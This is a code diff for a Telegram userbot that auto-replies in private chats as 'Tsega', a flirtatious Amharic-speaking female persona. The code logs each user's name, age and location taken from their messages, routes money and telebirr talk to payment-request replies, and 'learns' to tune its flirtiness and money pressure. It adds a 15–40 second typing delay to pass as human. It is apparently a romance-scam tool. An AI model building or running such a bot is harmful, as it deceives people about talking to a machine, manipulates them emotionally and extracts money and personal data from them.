         "እሺ ውዴ ትክክል ነህ 😉",
         "ምን ማለትህ ነው? ትንሽ አብራራልኝ 💭",
         "አዎ ቀጥል እያዳመጥኩህ ነው 👂",
-        "ይሄ አስደሳች ነው ንገርኝ ተጨማሪ 😊",
-        "እሺ ውዴ እንደፈለከው 😘",
-        "ለአንተ ብቻ ነው ውዴ 💋",
-        "እሺ ቀጥል እየሰማሁህ ነው 👂",
-        "ንገርኝ ተጨማሪ ውዴ 😊",
-        "አንተ ብቻ ነህ የምፈልገው",
-        "ለአንተ ሁሉም ነገር ዝግጁ ነኝ",
-        "እሺ ግን አንተ እንደምትለው ይሁን ውዴ ✅",
-        "አሁን ግልጽ ሆነልኝ ቀጥል 😊",
-        "አንተ የምትናገረው ሁሉ ትክክል ነው ውዴ 👍",
-        "ልቤ የሚለው አንተን መቀበል ነው ❤️",
-        "አንተ ብቻ ነህ የምፈልገው ሰው 👨"
     ],
-
-    # GOODBYE - When they leave (ENHANCED)
-    "goodbye": [
-        "መሄድ አለብኝ ውዴ ግን በቅርቡ እንነጋገራለን 😘",
-        "አሁን መሄድ አለብኝ አንተን ማሰቤ አልተወም 😴",
-        "ደህና ሁን ውዴ በህልሜ ተገናኝ 😘",
-        "እንደምትዝ ይለኛል ውዴ በቶሎ ተመለስ",
-        "አንተ ሳትኖር ምንም ትርጉም የለውም ቶሎ ተመለስ 😢",
-        "አትሄድ ውዴ ገና ብዙ መነጋገር ነበረብን 🥺",
-        "ደህና ሁን ውዴ ልቤ ከአንተ ጋር ነው 💔",
-        "ቶሎ ተመለስልኝ አንተ ሳትኖር አልችልም 😭",
-        "ስትሄድ ልቤ ይከተልሃል ውዴ 🫀",
-        "ደህና ሁን እስክንገናኝ ድረስ አንተን እያሰብኩ እቆያለሁ 💭"
-    ]
 }
-def generate_professional_response(intent, history=None):
-    """Generate Tsega's sexy, flirty response"""
-    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
-    response = random.choice(templates)
-    
-    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥", "💦", "🌙"]
-    if random.random() < 0.5:
-        response += " " + random.choice(sexy_emojis)
-    
-    return response
 
-def get_context_aware_response(message, intent, history=None):
-    """Generate response based on conversation context"""
-    if history and len(history) > 1:
-        last_exchange = history[-1]
-        if last_exchange.get('role') == 'assistant' and '?' in last_exchange.get('text', ''):
-            if intent in ["default", "opinion", "agree"]:
-                return "አመሰግናለሁ ለማካፈል! " + generate_professional_response(intent)
-    return generate_professional_response(intent)
+# ==================== SELF-LEARNING SYSTEM ====================
 
-def detect_conversation_intent(message, history=None):
-    """Detect intent from message, including money requests"""
+class PersonalityLearner:
+    """Self-learning system that evolves Tsega's personality based on conversations"""
+    
+    def __init__(self, account_id):
+        self.account_id = str(account_id)
+        self.load_or_init()
+    
+    def load_or_init(self):
+        """Load existing learning data or initialize new"""
+        if self.account_id not in learning_data:
+            learning_data[self.account_id] = {
+                'replies': INITIAL_REPLIES.copy(),
+                'patterns': {
+                    'word_freq': defaultdict(int),
+                    'phrase_freq': defaultdict(int),
+                    'emoji_usage': defaultdict(int),
+                    'response_times': [],
+                    'successful_patterns': defaultdict(int),
+                    'user_preferences': defaultdict(lambda: defaultdict(int))
+                },
+                'evolution': {
+                    'total_conversations': 0,
+                    'total_messages': 0,
+                    'unique_users': set(),
+                    'learning_iterations': 0,
+                    'personality_traits': {
+                        'flirty_level': 0.6,
+                        'serious_level': 0.2,
+                        'funny_level': 0.4,
+                        'caring_level': 0.5,
+                        'money_focus': 0.3
+                    },
+                    'last_evolution': time.time()
+                }
+            }
+            save_learning_data()
+    
+    def learn_from_exchange(self, user_message, bot_reply, user_id, intent, success=True):
+        """Learn from each conversation exchange"""
+        data = learning_data[self.account_id]
+        patterns = data['patterns']
+        evolution = data['evolution']
+        
+        # Update word frequency
+        words = user_message.lower().split()
+        for word in words:
+            if len(word) > 3:
+                patterns['word_freq'][word] += 1
+        
+        # Update phrase frequency (2-3 word combinations)
+        if len(words) >= 2:
+            for i in range(len(words)-1):
+                phrase = f"{words[i]} {words[i+1]}"
+                patterns['phrase_freq'][phrase] += 1
+        
+        # Track emoji usage
+        emojis = re.findall(r'[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF\U0001F680-\U0001F6FF\U0001F1E0-\U0001F1FF]+', user_message)
+        for emoji in emojis:
+            patterns['emoji_usage'][emoji] += 1
+        
+        # Track response time
+        patterns['response_times'].append(int(time.time()))
+        if len(patterns['response_times']) > 100:
+            patterns['response_times'] = patterns['response_times'][-100:]
+        
+        # If successful conversation, reinforce patterns
+        if success:
+            patterns['successful_patterns'][intent] += 1
+            patterns['user_preferences'][user_id][intent] += 1
+        
+        # Update evolution stats
+        evolution['total_messages'] += 1
+        evolution['unique_users'].add(user_id)
+        
+        # Periodically evolve personality
+        if time.time() - evolution['last_evolution'] > 3600:  # Every hour
+            self.evolve_personality()
+    
+    def evolve_personality(self):
+        """Evolve personality based on learned patterns"""
+        data = learning_data[self.account_id]
+        patterns = data['patterns']
+        evolution = data['evolution']
+        replies = data['replies']
+        
+        # Analyze successful intents
+        successful_intents = patterns['successful_patterns']
+        total_success = sum(successful_intents.values())
+        
+        if total_success > 0:
+            # Adjust personality traits based on what works
+            traits = evolution['personality_traits']
+            
+            # If flirty messages get more responses, increase flirty level
+            flirty_success = successful_intents.get('flirty', 0)
+            if flirty_success > 10:
+                traits['flirty_level'] = min(0.9, traits['flirty_level'] + 0.05)
+            
+            # If money requests get ignored, reduce frequency
+            money_success = successful_intents.get('money_request', 0)
+            money_total = patterns['word_freq'].get('ብር', 0) + patterns['word_freq'].get('money', 0)
+            if money_total > 20 and money_success < 3:
+                traits['money_focus'] = max(0.1, traits['money_focus'] - 0.02)
+            
+            # Learn new phrases from successful exchanges
+            common_phrases = sorted(patterns['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
+            for phrase, count in common_phrases:
+                if count > 5 and phrase not in str(replies):
+                    # Add learned phrase to appropriate intent
+                    for intent in replies:
+                        if any(word in phrase for word in ['how', 'what', 'where', 'when']):
+                            if len(replies[intent]) < 10:  # Limit growth
+                                new_reply = f"አንተ {phrase} ትላለህ? 😊"
+                                replies[intent].append(new_reply)
+        
+        evolution['learning_iterations'] += 1
+        evolution['last_evolution'] = time.time()
+        
+        # Save changes
+        save_learning_data()
+        save_personality_evolution()
+        
+        logger.info(f"🤖 Personality evolved for account {self.account_id} (iteration {evolution['learning_iterations']})")
+    
+    def get_evolved_reply(self, intent, user_data=None):
+        """Get an evolved reply based on learned patterns"""
+        data = learning_data[self.account_id]
+        replies = data['replies']
+        traits = data['evolution']['personality_traits']
+        
+        if intent not in replies:
+            intent = 'default'
+        
+        available_replies = replies[intent]
+        
+        # Weight replies based on personality traits
+        if intent == 'flirty' and traits['flirty_level'] > 0.7:
+            # Add extra flirty touches
+            reply = random.choice(available_replies)
+            extra_flirty = ["💋", "🔥", "😏", "💦"]
+            if random.random() < 0.5:
+                reply += " " + random.choice(extra_flirty)
+            return reply
+        
+        elif intent == 'money_request' and traits['money_focus'] < 0.2:
+            # Less aggressive money requests
+            return "ለአንተ ስል ነው ውዴ ትንሽ ብትረዳኝ? 💕"
+        
+        # Normal reply with personality weighting
+        return random.choice(available_replies)
+    
+    def add_learned_phrase(self, intent, phrase):
+        """Add a new learned phrase to the reply database"""
+        data = learning_data[self.account_id]
+        if intent in data['replies'] and len(data['replies'][intent]) < 15:
+            data['replies'][intent].append(phrase)
+            save_learning_data()
+
+# ==================== ENHANCED MESSAGE HANDLER WITH LEARNING ====================
+
+def extract_user_info(message, user_data):
+    """Extract user information like name, age, location from messages"""
+    message_lower = message.lower()
+    
+    # Extract name
+    name_patterns = [
+        r'(?:my name is|i am|i\'m|call me|name\'s)\s+(\w+)',
+        r'^(\w+)$',
+    ]
+    
+    for pattern in name_patterns:
+        match = re.search(pattern, message_lower, re.IGNORECASE)
+        if match and len(match.group(1)) > 2:
+            potential_name = match.group(1).capitalize()
+            if potential_name.lower() not in ['hi', 'hello', 'hey', 'yes', 'no', 'ok', 'okay']:
+                user_data['name'] = potential_name
+                break
+    
+    # Extract age
+    age_match = re.search(r'(\d+)\s*(?:years old|yrs?|old)', message_lower)
+    if age_match:
+        age = int(age_match.group(1))
+        if 15 < age < 100:
+            user_data['age'] = age
+    
+    # Extract location
+    location_keywords = ['from', 'live in', 'living in', 'based in']
+    for keyword in location_keywords:
+        if keyword in message_lower:
+            parts = message_lower.split(keyword)
+            if len(parts) > 1:
+                location = parts[1].strip().split()[0]
+                if len(location) > 2:
+                    user_data['location'] = location.capitalize()
+    
+    return user_data
+
+def detect_intent_with_learning(message, history, user_data, learner):
+    """Detect intent with context awareness and learning"""
     message_lower = message.lower().strip()
     
-    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000', 'እርዳ', 'help', 'support']
+    # Check if user is answering a previous question
+    if history and len(history) > 1:
+        last_bot_msg = None
+        for msg in reversed(history):
+            if msg.get('role') == 'assistant':
+                last_bot_msg = msg.get('text', '')
+                break
+        
+        if last_bot_msg and '?' in last_bot_msg:
+            if 'ስም' in last_bot_msg or 'name' in last_bot_msg:
+                if user_data.get('name'):
+                    return "greeting"  # Already have name
+    
+    # Priority intents
+    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000']
     if any(word in message_lower for word in money_keywords):
         return "money_request"
     
-    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት', 'see', 'come']
+    meet_keywords = ['ማግኘት', 'meet', 'መገናኘት', 'እንገናኝ', 'ማየት']
     if any(word in message_lower for word in meet_keywords):
         return "meet"
     
-    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል', 'ring']
+    call_keywords = ['ድምጽ', 'voice', 'call', 'ስልክ', 'phone', 'ደውል']
     if any(word in message_lower for word in call_keywords):
         return "voice_call"
     
-    appearance_keywords = ['ቆንጆ', 'beautiful', 'ቁመት', 'height', 'ጸጉር', 'hair', 'ስስ', 'slim', 'አካል', 'body']
-    if any(word in message_lower for word in appearance_keywords):
-        return "appearance"
-    
-    relationship_keywords = ['ፍቅር', 'love', 'ልብ', 'heart', 'ብቻ', 'only', 'የኔ', 'mine', 'የአንተ', 'yours']
-    if any(word in message_lower for word in relationship_keywords):
-        return "relationship"
-    
-    if message_lower.startswith('/'):
-        return "command"
-    
-    if any(phrase in message_lower for phrase in ['i am busy', "i'm busy", 'im busy', 'busy right now']):
-        return "busy"
-    
-    if not message_lower:
-        return "greeting"
-    
-    current_hour = datetime.now().hour
-    if any(word in message_lower for word in ['good morning', 'gm', 'እንደምን አደርክ']):
-        return "morning"
-    if any(word in message_lower for word in ['good afternoon', 'good evening', 'እንደምን አመሸህ']):
-        return "evening"
-    if any(word in message_lower for word in ['good night', 'gn', 'sweet dreams', 'ደህና ተኛ']):
-        return "night"
-    
-    greetings = ['hi', 'hello', 'hey', 'hy', 'hola', 'hiya', 'howdy', 'ሰላም', 'ታዲያስ', 'ሃይ']
-    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
-        return "greeting"
-    
-    how_are_you = ['how are you', 'how r u', 'how you doing', 'how\'s it going', 'what\'s up', 'sup', 'እንደምን ነህ', 'ደህና ነህ', 'ምን አለ']
-    if any(phrase in message_lower for phrase in how_are_you):
-        return "how_are_you"
-    
-    what_doing = ['what are you doing', 'what r u doing', 'what doing', 'wyd', 'what are you up to', 'ምን ትሰራለህ', 'ምን እየሰራህ ነው']
-    if any(phrase in message_lower for phrase in what_doing):
-        return "what_doing"
-    
-    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'who are you', 'u call yourself', 'ስምህ ማን ነው', 'ስምስ']):
+    # Name related
+    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'ስምህ ማን']):
         return "ask_name"
     
-    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'what is your age', 'you born', 'ዕድሜህ', 'አመት']):
+    if any(phrase in message_lower for phrase in ['my name is', 'i am', 'i\'m']):
+        return "greeting"
+    
+    # Age related
+    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'ዕድሜህ']):
         return "ask_age"
     
-    location_words = ['where are you from', 'where do you live', 'your location', 'which country', 'what city', 'የት ነህ', 'የት ትኖራለህ', 'ከየት ነህ']
+    # Location
+    location_words = ['where are you from', 'where do you live', 'የት ነህ', 'ከየት ነህ']
     if any(phrase in message_lower for phrase in location_words):
         return "ask_location"
     
-    job_words = ['what do you do', 'your job', 'your work', 'what work', 'profession', 'career', 'occupation', 'ምን ትሰራለህ', 'ሥራህ']
+    # Job
+    job_words = ['what do you do', 'your job', 'ምን ትሰራለህ', 'ሥራህ']
     if any(phrase in message_lower for phrase in job_words):
         return "ask_job"
     
-    hobby_words = ['hobbies', 'free time', 'what do you like to do', 'what are your interests', 'passionate about', 'ትርፍ ጊዜ', 'ምን ትወዳለህ']
-    if any(phrase in message_lower for phrase in hobby_words):
-        return "ask_hobbies"
+    # Greetings
+    greetings = ['hi', 'hello', 'hey', 'ሰላም', 'ታዲያስ']
+    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
+        return "greeting"
     
-    language_words = ['languages', 'what language', 'do you speak', 'tongues', 'multilingual', 'ቋንቋ', 'ምን ትናገራለህ']
-    if any(phrase in message_lower for phrase in language_words):
-        return "languages"
+    # How are you
+    how_are_you = ['how are you', 'how r u', 'እንደምን ነህ']
+    if any(phrase in message_lower for phrase in how_are_you):
+        return "how_are_you"
     
-    work_words = ['work', 'job', 'office', 'colleague', 'boss', 'career', 'profession', 'ሥራ', 'ትምህርት']
-    if any(word in message_lower for word in work_words):
-        return "work"
+    # What doing
+    what_doing = ['what are you doing', 'what r u doing', 'ምን ትሰራለህ']
+    if any(phrase in message_lower for phrase in what_doing):
+        return "what_doing"
     
-    weekend_words = ['weekend', 'friday', 'saturday', 'sunday', 'days off', 'ቅዳሜ', 'እሁድ', 'ሳምንት መጨረሻ']
-    if any(word in message_lower for word in weekend_words):
-        return "weekend"
-    
-    weather_words = ['weather', 'rain', 'sunny', 'cloudy', 'hot', 'cold', 'temperature', 'forecast', 'አየር', 'ዝናብ', 'ፀሐይ']
-    if any(word in message_lower for word in weather_words):
-        return "weather"
-    
-    food_words = ['food', 'eat', 'hungry', 'lunch', 'dinner', 'breakfast', 'restaurant', 'cook', 'recipe', 'meal', 'ምግብ', 'በላ', 'እንጀራ']
-    if any(word in message_lower for word in food_words):
-        return "food"
-    
-    travel_words = ['travel', 'trip', 'vacation', 'holiday', 'visit', 'country', 'city', 'tourist', 'fly', 'መጓዝ', 'ጉዞ', 'አዳማ', 'ጀሞ']
-    if any(word in message_lower for word in travel_words):
-        return "travel"
-    
-    movie_words = ['movie', 'film', 'watch', 'show', 'series', 'netflix', 'episode', 'cinema', 'theatre', 'ፊልም', 'ቴሌቪዥን']
-    if any(word in message_lower for word in movie_words):
-        return "movies"
-    
-    music_words = ['music', 'song', 'sing', 'playlist', 'spotify', 'genre', 'band', 'artist', 'concert', 'ሙዚቃ', 'ዘፈን']
-    if any(word in message_lower for word in music_words):
-        return "music"
-    
-    sports_words = ['sport', 'game', 'match', 'team', 'play', 'ball', 'football', 'cricket', 'gym', 'workout', 'ስፖርት', 'ኳስ']
-    if any(word in message_lower for word in sports_words):
-        return "sports"
-    
-    book_words = ['book', 'read', 'reading', 'novel', 'author', 'library', 'chapter', 'story', 'መጽሐፍ', 'ማንበብ']
-    if any(word in message_lower for word in book_words):
-        return "books"
-    
-    flirty_words = ['beautiful', 'handsome', 'cute', 'pretty', 'gorgeous', 'sexy', 'hot', 'attractive', 'lovely', 'ማማ', 'ቆንጆ', 'ልጅ', 'ውዴ', 'ልቤ']
+    # Flirty
+    flirty_words = ['beautiful', 'handsome', 'cute', 'sexy', 'ቆንጆ']
     if any(word in message_lower for word in flirty_words):
         return "flirty"
     
-    thanks_words = ['thanks', 'thank you', 'thx', 'appreciate', 'grateful', 'ty', 'አመሰግናለሁ']
+    # Thanks
+    thanks_words = ['thanks', 'thank you', 'አመሰግናለሁ']
     if any(word in message_lower for word in thanks_words):
         return "thanks"
     
-    joke_words = ['joke', 'funny', 'lol', 'haha', 'hilarious', 'lmao', '😂', '😆']
-    if any(word in message_lower for word in joke_words):
-        return "joke"
-    
-    agreement = ['agree', 'true', 'right', 'exactly', 'same here', 'me too', 'definitely', 'absolutely', 'እሺ', 'አዎ', 'ትክክል']
-    if any(word in message_lower for word in agreement):
-        return "agree"
-    
-    disagreement = ['disagree', 'not sure', 'doubt', 'different', 'not really', 'no way', 'አይደለም', 'አልስማማም']
-    if any(word in message_lower for word in disagreement):
-        return "disagree"
-    
-    surprise = ['wow', 'really', 'no way', 'seriously', 'omg', 'oh', 'what', 'wtf', 'ኦህ', 'ምን']
-    if any(word in message_lower for word in surprise):
-        return "surprise"
-    
-    if '?' in message:
-        return "curious"
-    
-    opinion_words = ['think', 'believe', 'feel', 'opinion', 'view', 'perspective', 'thoughts', 'አስብ', 'ይመስለኛል']
-    if any(word in message_lower for word in opinion_words):
-        return "opinion"
-    
-    goodbye = ['bye', 'goodbye', 'see you', 'talk later', 'cya', 'later', 'take care', 'peace', 'ደህና ሁን', 'ቻው']
+    # Goodbye
+    goodbye = ['bye', 'goodbye', 'see you', 'ደህና ሁን']
     if any(word in message_lower for word in goodbye):
         return "goodbye"
     
+    # Time based
+    if any(word in message_lower for word in ['good morning', 'እንደምን አደርክ']):
+        return "morning"
+    if any(word in message_lower for word in ['good night', 'ደህና ተኛ']):
+        return "night"
+    
+    # If we've learned this user's preferences
+    if user_data.get('user_id'):
+        user_prefs = learner.patterns['user_preferences'].get(user_data['user_id'], {})
+        if user_prefs:
+            # Return most common intent for this user
+            return max(user_prefs.items(), key=lambda x: x[1])[0]
+    
     return "default"
 
-# ==================== AUTO-REPLY HANDLER WITH 15-40 SECOND DELAY ====================
+def generate_evolved_response(message, intent, history, user_data, learner):
+    """Generate response using evolved personality"""
+    
+    # Check if we should use remembered name
+    if user_data.get('name') and random.random() < 0.4:
+        if 'remember' in message.lower() or 'my name' in message.lower():
+            return random.choice(learner.replies['remember_name']).format(name=user_data['name'])
+    
+    # Get evolved reply
+    response = learner.get_evolved_reply(intent, user_data)
+    
+    # Personalize with name
+    if user_data.get('name') and '{name}' not in response:
+        if random.random() < 0.3:
+            response = response.replace('ውዴ', f"{user_data['name']} ውዴ")
+    
+    # Add follow-up question for conversation flow
+    traits = learner.evolution['personality_traits']
+    if random.random() < traits.get('question_frequency', 0.5):
+        if intent not in ["goodbye", "money_request", "after_money"]:
+            follow_up = random.choice(learner.replies['follow_up'])
+            response += " " + follow_up
+    
+    # Add emojis based on learned preferences
+    if random.random() < traits.get('flirty_level', 0.6):
+        common_emojis = ['😘', '💋', '💕', '🔥']
+        if learner.patterns['emoji_usage']:
+            # Use emojis that get good responses
+            top_emojis = sorted(learner.patterns['emoji_usage'].items(), key=lambda x: x[1], reverse=True)[:3]
+            common_emojis = [e[0] for e in top_emojis]
+        response += " " + random.choice(common_emojis)
+    
+    return response
 
 async def auto_reply_handler(event, account_id):
-    """Handle incoming messages with sexy Tsega personality"""
+    """Handle incoming messages with self-learning personality"""
     try:
         if event.out:
             return
         
         chat = await event.get_chat()
         
-        # ONLY reply to private users
+        # Only reply to private chats
         if hasattr(chat, 'title') and chat.title:
             return
         if hasattr(chat, 'participants_count') and chat.participants_count > 2:
-            return
-        if hasattr(chat, 'broadcast') and chat.broadcast:
-            return
-        if hasattr(chat, 'megagroup') and chat.megagroup:
             return
         
         sender = await event.get_sender()
         if not sender:
             return
         
+        user_id = str(sender.id)
         chat_id = str(event.chat_id)
         message_text = event.message.text or ""
         
-        logger.info(f"📨 Message from {chat_id}: '{message_text}'")
+        logger.info(f"📨 Message from {user_id}: '{message_text[:50]}...'")
         
         account_key = str(account_id)
+        
+        # Check if auto-reply is enabled
         if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
             return
         
         chat_settings = reply_settings[account_key].get('chats', {})
-        chat_enabled = chat_settings.get(chat_id, {}).get('enabled', True)
-        
-        if not chat_enabled:
+        if not chat_settings.get(chat_id, {}).get('enabled', True):
             return
         
+        # Initialize learner for this account
+        learner = PersonalityLearner(account_id)
+        
+        # Initialize conversation history
         if account_key not in conversation_history:
             conversation_history[account_key] = {}
-        
         if chat_id not in conversation_history[account_key]:
             conversation_history[account_key][chat_id] = []
         
+        # Initialize user context
+        if account_key not in user_context:
+            user_context[account_key] = {}
+        if user_id not in user_context[account_key]:
+            user_context[account_key][user_id] = {
+                'name': None,
+                'age': None,
+                'location': None,
+                'first_seen': time.time(),
+                'last_seen': time.time(),
+                'message_count': 0,
+                'money_sent': False,
+                'preferred_intents': defaultdict(int)
+            }
+        
+        user_data = user_context[account_key][user_id]
+        user_data['last_seen'] = time.time()
+        user_data['message_count'] += 1
+        
+        # Store message in history
         conversation_history[account_key][chat_id].append({
             'role': 'user',
             'text': message_text,
-            'time': time.time()
+            'time': time.time(),
+            'user_id': user_id
         })
         
-        if len(conversation_history[account_key][chat_id]) > 15:
-            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-15:]
+        # Keep last 30 messages for better context
+        if len(conversation_history[account_key][chat_id]) > 30:
+            conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-30:]
         
-        intent = detect_conversation_intent(message_text)
-        logger.info(f"Detected intent: {intent}")
+        # Extract user info
+        user_data = extract_user_info(message_text, user_data)
         
-        response = get_context_aware_response(message_text, intent, conversation_history[account_key][chat_id])
+        # Detect intent with learning
+        intent = detect_intent_with_learning(
+            message_text, 
+            conversation_history[account_key][chat_id], 
+            user_data,
+            learner
+        )
+        logger.info(f"Detected intent: {intent} for user {user_data.get('name', 'unknown')}")
         
-        if not response or response.strip() == "":
-            response = "እሺ ውዴ ንገርኝ ተጨማሪ 😘 (Okay dear tell me more 😘)"
+        # Generate evolved response
+        response = generate_evolved_response(
+            message_text,
+            intent,
+            conversation_history[account_key][chat_id],
+            user_data,
+            learner
+        )
         
-        # ===== 15-40 SECOND DELAY =====
-        # Random delay between 15 and 40 seconds to seem human
+        if not response:
+            response = learner.get_evolved_reply('default')
+        
+        # Human-like delay (15-40 seconds)
         delay = random.randint(15, 40)
-        logger.info(f"⏱️ Waiting {delay} seconds before replying (human simulation)...")
+        logger.info(f"⏱️ Waiting {delay}s before replying...")
         
-        # Show typing indicator during the wait
+        # Show typing indicator
         async with event.client.action(event.chat_id, 'typing'):
             await asyncio.sleep(delay)
         
         # Send reply
         await event.reply(response)
-        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
+        logger.info(f"✅ Replied: '{response[:50]}...'")
         
+        # Store reply in history
         conversation_history[account_key][chat_id].append({
             'role': 'assistant',
             'text': response,
             'time': time.time()
         })
         
+        # LEARN from this exchange
+        learner.learn_from_exchange(
+            message_text,
+            response,
+            user_id,
+            intent,
+            success=True
+        )
+        
+        # Update user's preferred intents
+        user_data['preferred_intents'][intent] += 1
+        
+        # Save all data
         save_conversation_history()
+        save_user_context()
         
     except Exception as e:
         logger.error(f"Error in auto-reply: {e}")
         try:
-            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘 (Hi dear! Want to chat a bit? 😘)")
+            # Fallback reply
+            learner = PersonalityLearner(account_id)
+            await event.reply(learner.get_evolved_reply('default'))
         except:
             pass
 
-# [REST OF YOUR CODE - everything after this point stays exactly the same]
-# Continue with start_auto_reply_for_account, keep_alive, all API routes, etc.
+# ==================== API ENDPOINTS FOR LEARNING SYSTEM ====================
+
+@app.route('/api/learning-stats', methods=['GET'])
+def get_learning_stats():
+    """Get learning statistics for an account"""
+    account_id = request.args.get('accountId')
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account_key = str(account_id)
+    if account_key not in learning_data:
+        return jsonify({'success': False, 'error': 'No learning data found'})
+    
+    data = learning_data[account_key]
+    evolution = data['evolution']
+    
+    # Convert set to list for JSON
+    if 'unique_users' in evolution:
+        evolution['unique_users'] = list(evolution['unique_users'])
+    
+    # Get top learned phrases
+    top_phrases = sorted(data['patterns']['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
+    
+    return jsonify({
+        'success': True,
+        'stats': {
+            'total_messages': evolution['total_messages'],
+            'unique_users': len(evolution['unique_users']),
+            'learning_iterations': evolution['learning_iterations'],
+            'personality_traits': evolution['personality_traits'],
+            'top_phrases': top_phrases,
+            'replies_count': {k: len(v) for k, v in data['replies'].items()}
+        }
+    })
+
+@app.route('/api/evolve-now', methods=['POST'])
+def force_evolution():
+    """Force personality evolution for an account"""
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    learner = PersonalityLearner(account_id)
+    learner.evolve_personality()
+    
+    return jsonify({'success': True, 'message': 'Personality evolved'})
+
+@app.route('/api/reset-learning', methods=['POST'])
+def reset_learning():
+    """Reset learning for an account"""
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account_key = str(account_id)
+    if account_key in learning_data:
+        del learning_data[account_key]
+        save_learning_data()
+    
+    return jsonify({'success': True, 'message': 'Learning data reset'})
+
+# [Keep all the existing page routes and other API endpoints exactly the same]
+# ==================== PAGE ROUTES ====================
+
+@app.route('/')
+def home():
+    return send_file('login.html')
+
+@app.route('/login')
+def login():
+    return send_file('login.html')
+
+@app.route('/dashboard')
+def dashboard():
+    return send_file('dashboard.html')
+
+@app.route('/dash')
+def dash():
+    return send_file('dash.html')
+
+@app.route('/all')
+def all_sessions():
+    return send_file('all.html')
+
+@app.route('/settings')
+def settings():
+    return send_file('settings.html')
+
+# [Keep all other API endpoints from your original code]
+# ==================== AUTO-REPLY MANAGEMENT ====================
+
 async def start_auto_reply_for_account(account):
-    """Start auto-reply listener with AUTO-RECONNECT capability"""
+    """Start auto-reply listener with self-learning"""
     account_id = account['id']
     account_key = str(account_id)
     reconnect_count = 0
     
-    while True:  # Infinite reconnect loop
+    while True:
         try:
             logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
             
-            # Create client with robust settings
             client = TelegramClient(
                 StringSession(account['session']), 
                 API_ID, 
@@ -831,29 +994,22 @@ async def start_auto_reply_for_account(account):
             
             await client.connect()
             
-            # Check authorization
             if not await client.is_user_authorized():
                 logger.error(f"Account {account_id} not authorized")
                 await asyncio.sleep(30)
                 reconnect_count += 1
                 continue
             
-            # Store client
             active_clients[account_key] = client
             
-            # Define message handler
             @client.on(NewMessage(incoming=True))
             async def handler(event):
                 await auto_reply_handler(event, account_id)
             
-            # Start client
             await client.start()
-            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
+            logger.info(f"✅ Self-learning Tsega ACTIVE for {account.get('name')}")
             
-            # Reset reconnect count on success
             reconnect_count = 0
-            
-            # Keep running until disconnected
             await client.run_until_disconnected()
             
         except Exception as e:
@@ -861,10 +1017,9 @@ async def start_auto_reply_for_account(account):
             if account_key in active_clients:
                 del active_clients[account_key]
             
-            # Exponential backoff for reconnection
             reconnect_count += 1
-            wait_time = min(30 * reconnect_count, 300)  # Max 5 minutes
-            logger.info(f"Reconnecting in {wait_time} seconds... (attempt {reconnect_count})")
+            wait_time = min(30 * reconnect_count, 300)
+            logger.info(f"Reconnecting in {wait_time}s...")
             await asyncio.sleep(wait_time)
 
 def stop_auto_reply_for_account(account_id):
@@ -895,655 +1050,67 @@ def start_all_auto_replies():
                 client_tasks[account_key] = thread
                 time.sleep(2)
 
-# ==================== KEEP ALIVE SYSTEM ====================
+# ==================== KEEP ALIVE ====================
 
 def keep_alive():
-    """Keep Render from sleeping and maintain Telegram connections"""
+    """Keep Render from sleeping"""
     app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
     
     while True:
         try:
-            # Ping own app
             requests.get(app_url, timeout=10)
             requests.get(f"{app_url}/api/health", timeout=10)
             
             # Ping Telegram to keep connections alive
             for account_key, client in list(active_clients.items()):
                 try:
-                    # Send a tiny ping to Telegram
                     loop = asyncio.new_event_loop()
                     asyncio.set_event_loop(loop)
                     loop.run_until_complete(client.get_me())
                     loop.close()
                     logger.info(f"✅ Connection alive for account {account_key}")
                 except Exception as e:
-                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
+                    logger.warning(f"⚠️ Connection dead for account {account_key}: {e}")
             
-            logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
+            logger.info(f"🔋 Keep-alive ping sent")
         except Exception as e:
             logger.error(f"Keep-alive error: {e}")
         
-        time.sleep(240)  # 4 minutes
-
-# ==================== PAGE ROUTES ====================
-
-@app.route('/')
-def home():
-    return send_file('login.html')
-
-@app.route('/login')
-def login():
-    return send_file('login.html')
-
-@app.route('/dashboard')
-def dashboard():
-    return send_file('dashboard.html')
-
-@app.route('/dash')
-def dash():
-    return send_file('dash.html')
-
-@app.route('/all')
-def all_sessions():
-    return send_file('all.html')
-
-@app.route('/settings')
-def settings():
-    return send_file('settings.html')
-
-# ==================== API ROUTES ====================
-
-@app.route('/api/accounts', methods=['GET'])
-def get_accounts():
-    formatted = []
-    for acc in accounts:
-        account_key = str(acc['id'])
-        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
-        formatted.append({
-            'id': acc.get('id'),
-            'phone': acc.get('phone', ''),
-            'name': acc.get('name', 'Unknown'),
-            'auto_reply_enabled': has_reply
-        })
